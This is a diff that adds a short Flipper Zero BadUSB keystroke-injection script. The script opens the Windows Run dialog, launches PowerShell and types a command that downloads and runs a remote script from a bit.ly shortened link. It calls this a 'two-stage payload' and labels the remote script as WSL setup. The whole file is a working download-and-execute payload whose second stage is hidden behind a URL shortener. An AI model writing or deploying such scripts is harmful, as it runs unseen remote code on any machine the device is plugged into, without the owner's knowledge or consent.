@@ -1,0 +1,25 @@
+# Flipper Zero minimal BadUSB script - Two-stage payload approach
+# This script opens PowerShell and downloads the full payload from GitHub
+
+# Delay before starting
+DELAY 3000
+
+# Press Win+R to open Run dialog
+GUI r
+DELAY 1000
+
+# Type "powershell" and press Enter
+STRING powershell
+DELAY 500
+ENTER
+DELAY 2000
+
+# Clear any unwanted characters that might appear
+BACKSPACE
+BACKSPACE
+BACKSPACE
+
+# Download and execute WSL setup script
+STRING iex (New-Object Net.WebClient).DownloadString('https://bit.ly/wsl-setup')
+DELAY 500
+ENTER 
